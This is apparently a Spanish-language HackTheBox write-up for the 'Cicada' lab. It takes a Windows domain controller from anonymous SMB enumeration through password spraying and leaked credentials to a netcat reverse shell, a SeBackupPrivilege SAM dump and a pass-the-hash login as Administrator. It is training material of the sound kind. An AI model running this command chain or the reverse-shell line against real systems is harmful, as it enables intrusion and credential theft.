---
title: "HTB - Cicada"
project: "Cicada Corp"
platform: "Windows Server 2022 / Active Directory"
os: "Windows Server 2022"
tags:
  - ActiveDirectory
  - Windows
  - SMB
  - Kerberos
  - WinRM
  - Pentesting
  - HTB
  - SeBackupPrivilege
  - Pass-the-Hash
hashtags:
  - "#ActiveDirectory"
  - "#Windows"
  - "#SMB"
  - "#Kerberos"
  - "#WinRM"
  - "#Pentesting"
  - "#HTB"
  - "#SeBackupPrivilege"
  - "#PassTheHash"
image:
  path: /assets/img/posts/htb/cicada/banner.png
toc_label: "📑 Contenido"
toc_sticky: true
---

## Resumen Ejecutivo

Se realizó una prueba de penetración contra el entorno de **Cicada Corp**, un controlador de dominio Windows Server 2022 configurado con servicios Active Directory. El objetivo fue evaluar la postura de seguridad del dominio `cicada.htb` y determinar el impacto de posibles vulnerabilidades.

### Hallazgos Críticos

|Severidad|Hallazgo|Impacto|
|---|---|---|
|🔴 **Crítica**|Credenciales de administrador extraídas mediante SeBackupPrivilege|Compromiso total del dominio|
|🔴 **Crítica**|Contraseña de administrador en texto plano en archivo SMB|Acceso no autorizado al dominio|
|🟠 **Alta**|Contraseñas en descripciones de usuarios AD|Filtración de credenciales corporativas|
|🟠 **Alta**|Contraseñas en scripts de backup en texto plano|Exposición de credenciales de servicio|
|🟡 **Media**|Null session habilitada en SMB|Enumeración anónima de recursos|
|🟢 **Baja**|Kerberos expuesto sin restricciones|Enumeración de usuarios potencial|

### Vectores de Ataque Utilizados

1. **Enumeración SMB Anónima** → Descubrimiento de contraseña por defecto
2. **Password Spraying** → Compromiso de cuenta de usuario
3. **rpcclient Enumeration** → Descubrimiento de credenciales en descripciones
4. **SMB Share Enumeration** → Filtración de credenciales en scripts
5. **WinRM Access** → Obtención de shell interactiva
6. **SeBackupPrivilege Abuse** → Dump de SAM y extracción de hashes NTLM
7. **Pass-the-Hash** → Compromiso total del dominio

### Métricas de Impacto

- **Confidencialidad**: 🔴 Comprometida (acceso a todos los archivos del sistema)
- **Integridad**: 🔴 Comprometida (capacidad de modificar configuraciones críticas)
- **Disponibilidad**: 🟡 Potencialmente comprometida (riesgo de ransomware o denegación de servicio)
- **Tiempo hasta compromiso total**: ~45 minutos desde enumeración inicial

## Enumeracion y reconocimiento
### Nmap
**Comand:**
```bash
nmap -p- --open -sS --min-rate=1000 -n -v -Pn $(target) -oN allPorts.txt
```
**Output**
```bash
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
58519/tcp open  unknown
```
El escaneo inicial de puertos revela que la máquina tiene múltiples servicios de Active Directory expuestos. El puerto **5985 (WinRM)** es particularmente relevante ya que permite la administración remota y será utilizado posteriormente para obtener acceso shell. Los puertos **88 (Kerberos)** y **445 (SMB)** son los principales vectores de ataque en esta máquina.

![Domain](/assets/img/posts/htb/cicada/1.png)
NetExec para saber si tiene DC. y el dominio para agregar a **/etc/hosts**
```bash
nxc smb $(target)
SMB         10.129.16.40    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)

echo "10.129.231.149 cicada.htb" | sudo tee -a /etc/hosts
```
El comando NetExec confirma que el dominio es `cicada.htb` y que el servidor acepta autenticación nula (Null Auth: True). Esta es una vulnerabilidad crítica que permite enumeración anónima.

### Kerbrute (pueto 88 expuesto)
El puerto Kerberos (88) expuesto permite enumerar usuarios válidos del dominio sin necesidad de autenticación.
#### Enumerando usuarios
Primero **kerbrute** por el peurto `88`
```bash
# 1
kerburete userenum --dc $(target) -d cicada.htb /usr/share/seclists/Usernames/names/names.txt
# 2
kerbrute userenum --dc 10.129.231.149 -d cicada.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
**Resultados:**
```bash
2026/06/17 18:22:46 >  [+] VALID USERNAME:	guest@cicada.htb
2026/06/17 18:23:01 >  [+] VALID USERNAME:	administrator@cicada.htb
```

La enumeración Kerberos confirma la existencia de las cuentas `guest` y `administrator`. La cuenta guest es particularmente valiosa para el siguiente paso.

#### Al obtener credenciales enumeramos mas usuarios

Entrando con **nxc** procedemos a utilizar **--rid-brute**

![rid brute](/assets/img/posts/htb/cicada/2.png)
```bash
nxc smb $(target) -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
SMB                      10.129.16.40    445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.129.16.40    445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.129.16.40    445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.129.16.40    445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.129.16.40    445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.129.16.40    445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.129.16.40    445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.129.16.40    445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.129.16.40    445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```
El RID brute-force con NetExec es una técnica efectiva para enumerar todos los usuarios del dominio. Esta técnica funciona porque el RID (Relative Identifier) es secuencial y predecible en Active Directory. La cuenta `krbtgt` (RID 502) es la cuenta de servicio de Kerberos y su presencia confirma que el servidor es un Controlador de Dominio.

**Output con filtrado**:
```bash
cat users.txt | grep "SidTypeUser" | awk '{print $6}' | tr '\' ' ' | awk '{print $2}' | sponge users.txt

Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
```


#### Intentando obtener TGT **impacket-GetNPUsers**
```
```
El comando `impacket-GetNPUsers` se utiliza para realizar AS-REP Roasting, un ataque que permite obtener hashes de usuarios que tienen `Kerberos Pre-Authentication` deshabilitado. En este caso, el comando no devuelve resultados, lo que indica que todos los usuarios tienen pre-autenticación habilitada.



### Reconocimiento SMB

El servicio SMB es el principal vector de ataque en esta máquina, ya que permite acceder a recursos compartidos con autenticación nula.
#### Viendo recursos compartidos con permisos 
**Comando uitlizado:**
```bash
# Comando
nxc smb $(target) -u 'guest' -p '' --shares

```
**Resultado**:
```bash
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV                             
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL                          Logon server share 
```
El share **HR** tiene permiso READ para usuarios anónimos. Esto es inusual y representa un riesgo de seguridad. Los shares **DEV** y **HR** son shares personalizados que probablemente contienen información sensible. Los shares **NETLOGON** y **SYSVOL** son shares críticos de Active Directory que siempre están presentes en un DC.


![Recursos](/assets/img/posts/htb/cicada/3.png)
#### Listado de recursos compartidos
**Comando uilitzado**: (enumerando recurso)
```bash
smbmap -H $(target) -u 'guest' -p '' -r HR
```
**Resultado:**
```bash
[+] IP: 10.129.231.149:445	Name: cicada.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	
	HR                                                	READ ONLY	
	./HR
	dr--r--r--                0 Fri Mar 15 07:26:17 2024	.
	dr--r--r--                0 Thu Mar 14 13:21:29 2024	..
	fr--r--r--             1266 Wed Aug 28 19:31:48 2024	Notice from HR.txt

```
El share HR contiene un solo archivo: `Notice from HR.txt`. El nombre sugiere que es un aviso de Recursos Humanos, típicamente utilizado por los administradores para comunicar políticas de contraseñas a nuevos empleados.
#### Descargando recurso
**Comando:**
```bash
❯ smbclient //10.129.231.149/HR -N
```
**Resutlado:**
```bash
smb: \> dir
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

		4168447 blocks of size 4096. 475899 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (2,7 KiloBytes/sec) (average 2,7 KiloBytes/sec)


cat 'Notice from HR.txt'
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Notice from HR.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ Dear new hire!
   3   │ 
   4   │ Welcome to Cicada <...MORE...>
   5   │ 
   6   │ Your default password is: Cicada$M6Corpb*@Lp#nZp!8
   7   │ 
   8   │ To change your password:
   9   │ <...MORE...>
  21   │ 
  22   │ Best regards,
  23   │ Cicada Corp
───────┴──────────────────────────────────────────
```
El archivo contiene la contraseña por defecto para nuevos empleados: `Cicada$M6Corpb*@Lp#nZp!8`. Esta contraseña es compleja pero está expuesta en texto plano en un recurso accesible anónimamente. Es muy probable que algunos usuarios no hayan cambiado su contraseña por defecto.
Datos sensibles expuestos
```js
echo "Cicada$M6Corpb*@Lp#nZp!8" > pass.txt
```


### Intrusión
#### Enumerando con nueva contraseña
**Comando:**
```js
nxc smb $(target) -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success --shares

SMB         10.129.16.40    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 

```
**Resultados**:
```bash
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\:Cicada$M6Corpb*@Lp#nZp!8 (Guest)

# Datos expuestos
michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```
El password spraying revela que **michael.wrightson** todavía está usando la contraseña por defecto. Esto es una violación de la política de contraseñas y un riesgo de seguridad significativo.
### Pivoting de usuario 1
Con las credenciales de Michael Wrightson, se procede a enumerar más información del dominio.

No cuenta con acceso al recurso **dev** expuesto.
```bash
nxc smb $(target) -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```
Aunque Michael tiene credenciales válidas, no tiene permisos para acceder al share DEV, lo que sugiere que el share DEV está restringido a un grupo específico.
#### Enumerando en rpcclient
**rpcclient** comando
```bash
rpcclient $(target) -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8'
```

**Resultados**
```bash
rpcclient $> enumdomusers
	user:[Administrator] rid:[0x1f4]
	user:[Guest] rid:[0x1f5]
	user:[krbtgt] rid:[0x1f6]
	user:[john.smoulder] rid:[0x450]
	user:[sarah.dantelia] rid:[0x451]
	user:[michael.wrightson] rid:[0x452]
	user:[david.orelious] rid:[0x454]
	user:[emily.oscars] rid:[0x641]

rpcclient $> netshareenum
result was WERR_ACCESS_DENIED

rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	mié, 17 jun 2026 22:05:48 CEST
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 01 ene 1970 01:00:00 CET
	Password last set Time   :	lun, 26 ago 2024 22:08:03 CEST
	Password can change Time :	mar, 27 ago 2024 22:08:03 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000005
	logon_count:	0x0000006e
	padding1[0..7]...
	logon_hrs[0..21]...
	
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Groups] rid:[0x44f]
group:[Dev Support] rid:[0x455]
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xfeb RID: 0x454 acb: 0x00000210 Account: david.orelious	Name: (null)	Desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
index: 0x101d RID: 0x641 acb: 0x00000210 Account: emily.oscars	Name: Emily Oscars	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfe7 RID: 0x450 acb: 0x00000210 Account: john.smoulder	Name: (null)	Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xfe9 RID: 0x452 acb: 0x00000210 Account: michael.wrightson	Name: (null)	Desc: (null)
index: 0xfe8 RID: 0x451 acb: 0x00000210 Account: sarah.dantelia	Name: (null)	Desc: (null)
rpcclient $> 
```
El comando `querydispinfo` es particularmente valioso porque revela la descripción de los usuarios. El usuario **david.orelious** tiene su contraseña en el campo Descripción: `aRt$Lp#7t*VQ!3`. Esta es una mala práctica de seguridad extremadamente común pero peligrosa.
**Qué buscar en cada `queryuser`:**
- `Account Name`: Nombre del usuario
- `Full Name`: Nombre completo (a veces contiene pistas)
- `Primary Group RID`: Grupo primario (513 = Domain Users, 512 = Domain Admins)
- `Home Directory`: Directorio personal (puede tener rutas)
- `Last Logon`: Última conexión (indica usuarios activos)
- `Password Last Set`: Último cambio de contraseña

Informacion **sensible** expuesta
```bash
index: 0xfeb RID: 0x454 acb: 0x00000210 Account: david.orelious	Name: (null)	Desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
--> aRt$Lp#7t*VQ!3
```

Alternativa a descripcion de usuario:
```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -- users
```

### Pivoting de usuario N2
Con las credenciales de David Orelious, se procede a enumerar más recursos del dominio. Este usuario tiene acceso al share DEV, que contiene información valiosa.

Con las credenciales anteriores procedo a verificar credenciales con resultado satisfactorios  
**comando:**
```bash
nxc smb $(target) -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

**Resultado:**
```bash
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 

SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------

SMB         10.129.231.149  445    CICADA-DC        DEV             READ            
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
```

David tiene permisos de lectura en los shares DEV y HR. Esto confirma que el share DEV está restringido a usuarios específicos como David.
Ver el contenido del recurso **DEV**  
**Comando:**
```bash
smbclient //10.129.231.149/DEV -U 'david.orelious%%aRt$Lp#7t*VQ!3'
```
**Resultado:**
```bash
# Descargando recurso
smb: \> dir
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024

		4168447 blocks of size 4096. 453267 blocks available
smb: \> get Backup_script.ps1
```

![SMBmap](/assets/img/posts/htb/cicada/5.png)

![smbclient](/assets/img/posts/htb/cicada/6.png)

El share DEV contiene un script de PowerShell llamado `Backup_script.ps1`. Este script es un script de backup que utiliza credenciales embebidas. Esta es una de las prácticas de seguridad más peligrosas en entornos corporativos.
#### Contenido del recurso compartido en **DEV**:
```bash
❯ cat Backup_script.ps1
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Backup_script.ps1
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ $sourceDirectory = "C:\smb"
   3   │ $destinationDirectory = "D:\Backup"
   4   │ 
   5   │ $username = "emily.oscars"
   6   │ $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
   7   │ $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
   8   │ $dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
   9   │ $backupFileName = "smb_backup_$dateStamp.zip"
  10   │ $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
  11   │ Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
  12   │ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
Datos sensibles **expuestos:**
```bash
$username = "emily.oscars" $password = "Q!3@Lp#M6b*7t*Vt"
```

El script contiene las credenciales de **emily.oscars** en texto plano. Emily es una usuaria del dominio, y sus credenciales permitirán el siguiente pivote.
#### Enumerando usuario **david orelious**
**Comando**
```bash
❯ rpcclient $(target) -U 'david.orelious%aRt$Lp#7t*VQ!3'
rpcclient $> enumprivs
```
**Resultado relevante:**
```bash
SeBackupPrivilege 		0:17 (0x0:0x11)
SeRestorePrivilege 		0:18 (0x0:0x12)
SeShutdownPrivilege 		0:19 (0x0:0x13)
SeDebugPrivilege 		0:20 (0x0:0x14)
SeAuditPrivilege 		0:21 (0x0:0x15)
```

```bash
# Algunas enumeraciones
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	mié, 17 jun 2026 22:05:48 CEST
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 01 ene 1970 01:00:00 CET
	Password last set Time   :	lun, 26 ago 2024 22:08:03 CEST
	Password can change Time :	mar, 27 ago 2024 22:08:03 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x0000006e
	padding1[0..7]...
	logon_hrs[0..21]...
```
Los privilegios de David incluyen `SeBackupPrivilege` y `SeRestorePrivilege`, que son privilegios extremadamente potentes. Estos privilegios permiten leer cualquier archivo del sistema y restaurar archivos, respectivamente.
### Acceso al sistema. **winrm**
Al obtener todas las credenciales proceso a probar cada una en **winrm**
**Comando:**
```bash
nxc winrm $(target) -u users.txt -p passwords.txt --continue-on-success
```
**Resultado:**
```js
WINRM       10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) 
WINRM       10.129.231.149  5985   CICADA-DC        [-] cicada.htb\Administrator:Cicada*@Lp#nZpls
<........ETC.........>
WINRM       10.129.231.149  5985   CICADA-DC        [-] cicada.htb\david.orelious:Q!3@Lp#M6b*7t*Vt
WINRM       10.129.231.149  5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)  <--- Acceso
```
El comando confirma que **emily.oscars** tiene acceso a WinRM. WinRM (Windows Remote Management) es un servicio que permite la administración remota de sistemas Windows. Tener acceso a WinRM con credenciales válidas proporciona una shell interactiva.
#### winrm y enumeracion
**Comando:**
```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i $(target)
```
Una vez conectado como Emily, se puede proceder a la enumeración del sistema y la escalada de privilegios.

#### Entablando conexion con metasploit
```bash
# En kali (metasploit)
use multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST $(target)
run
```

```bash
# En winrm
> upload nc.exe
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> .\nc.exe -e cmd.exe 10.10.14.26 4444
```
Se utiliza Metasploit para obtener una shell más estable y poder utilizar herramientas de post-explotación como el suggester de exploits locales.  
Lanzando **suggester**, para enumerar el sistema.
```bash
# En kali
use multi/recon/local_exploit_suggester
set SESSION 1
run
```
**Resultados:**
```bash
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.231.149 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 10.129.231.149 - 253 exploit checks are being tried...
[+] 10.129.231.149 - exploit/windows/persistence/registry: The target is vulnerable. Registry writable
[+] 10.129.231.149 - exploit/windows/persistence/registry_active_setup: The target is vulnerable. Registry writable
[+] 10.129.231.149 - exploit/windows/persistence/userinit_mpr_logon_script: The target is vulnerable. Registry path is writable

[*] 10.129.231.149 - Valid modules for session 1:
============================

 #   Name                                                         Potentially Vulnerable?  Check Result
 -   ----                                                         -----------------------  ------------
 1   exploit/windows/persistence/registry                         Yes                      The target is vulnerable. Registry writable
 2   exploit/windows/persistence/registry_active_setup            Yes                      The target is vulnerable. Registry writable
 3   exploit/windows/persistence/userinit_mpr_logon_script        Yes                      The target is vulnerable. Registry path is writable
 4   exploit/multi/persistence/ssh_key                            No                       The target is not exploitable. sshd_config file not found
 5   exploit/windows/local/cve_2024_30085_cloud_files             No                       The target is not exploitable. Version Windows Server 2022 is not vulnerable
 6   exploit/windows/local/win_error_cve_2023_36874               No                       The target is not exploitable. Version Windows Server 2022 is not vulnerable
 7   exploit/windows/persistence/accessibility_features_debugger  No                       The target is not exploitable. You have admin rights to run this Module
 8   exploit/windows/persistence/notepadpp_plugin                 No                       The target is not exploitable. Notepad++ is probably not present
 9   exploit/windows/persistence/registry_userinit                No                       The target is not exploitable. Unable to read registry path HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon with key Userinit
 10  exploit/windows/persistence/service                          No                       The target is not exploitable. You must be System/Admin to run this Module
 11  exploit/windows/persistence/startup_folder                   No                       The check raised an exception.

[*] Post module execution completed
```
El suggester de Metasploit identifica algunas vulnerabilidades de persistencia, pero la escalada de privilegios se realizará mediante la explotación de los privilegios `SeBackupPrivilege` y `SeRestorePrivilege`.

#### Elevando privilegios y enumerando sistema con metasploit y winpeas
Teniendo conectividad de metasploit vamos a buscar elevar la shell a **meterpreter** 
```bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 10.10.14.26
set LPORT 4433
run
```
Usando la meterpreter subimos el **winPEAS**
```bash
sessions -i 2
upload -f winPEASany.exe .
shell
dir
.\winPEASany.exe > winpeas_cicada.txt
```

WinPEAS es una herramienta de enumeración de privilegios para Windows. Aunque no es estrictamente necesario para esta máquina, ayuda a identificar vectores de escalada de privilegios.

#### Enumerando permisos
**Comando:**
```bash
C:\Users\emily.oscars.CICADA\Documents>         whoami /priv
												whoami /groups
C:\Users\emily.oscars.CICADA\Documents>         net user  

```
**Resultados:**
```bash
C:\Users\emily.oscars.CICADA\Documents>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

-------------------------------------------------------------------------------------------------------------------------------------------------------


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288    

-------------------------------------------------------------------------------------------------------------------------------------------------------
net user
User accounts for \\

-------------------------------------------------------------------------------------------------------------------------------------------------------
Administrator            david.orelious           emily.oscars             
Guest                    john.smoulder            krbtgt                   
michael.wrightson        sarah.dantelia           
The command completed with one or more errors.
```
El comando `whoami /priv` revela que Emily tiene habilitados los privilegios **SeBackupPrivilege** y **SeRestorePrivilege**. El comando `whoami /groups` confirma que Emily es miembro del grupo **BUILTIN\Backup Operators**, lo que le otorga estos privilegios.
Informacion **sensible** expuesta
```bash
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
```


#### Explotando permisos **SeBackupPrivilege**
**Comandos:**
```bash
To abuse this vulnerability you should follow these steps:

# 1. Create a temp directory:
mkdir C:\temp


# 2. Copy the sam and system hive of HKLM to C:\temp and then download them.

reg save hklm\sam C:\temp\sam.hive
and
reg save hklm\system C:\temp\system.hive

download sam.hive
download system.hive

# 3. Use impacket-secretsdump tool (Kali Linux Default) and obtain ntlm hashes:

impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

**Resultados:**
```bash

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Acceso como ROOT
**Comando**
```bash
 evil-winrm -i 10.129.231.149 -u Administrator -H "2b87e7c93a3e8a0ea4a581937016f341"
```

![Root](/assets/img/posts/htb/cicada/7.png)

Con el hash NTLM del administrador, se utiliza **Pass-the-Hash** para autenticarse como `Administrator` a través de WinRM. Esto otorga acceso total al dominio. Se obtiene la flag de root en el escritorio del Administrador.

### Alternativas para elevar privilegios

Además de `SeBackupPrivilege`, otros vectores de escalada de privilegios que podrían utilizarse incluyen:

- **SeImpersonatePrivilege** (Potato attacks): Técnicas como JuicyPotato, RoguePotato o PrintSpoofer permiten impersonar tokens de SYSTEM.
    
- **SeDebugPrivilege** (Dump LSASS): Permite leer la memoria de procesos como LSASS, donde se almacenan credenciales en memoria.
    
- **Kerberoasting**: Si hubiera cuentas con SPNs (Service Principal Names) y contraseñas débiles, se podrían crackear offline.

## Lecciones Aprendidas

1. **Nunca almacenar contraseñas en texto plano** en scripts, descripciones de AD o archivos compartidos
2. **Auditar regularmente** los usuarios que mantienen contraseñas por defecto
3. **Restringir privilegios** como SeBackupPrivilege solo a cuentas de servicio
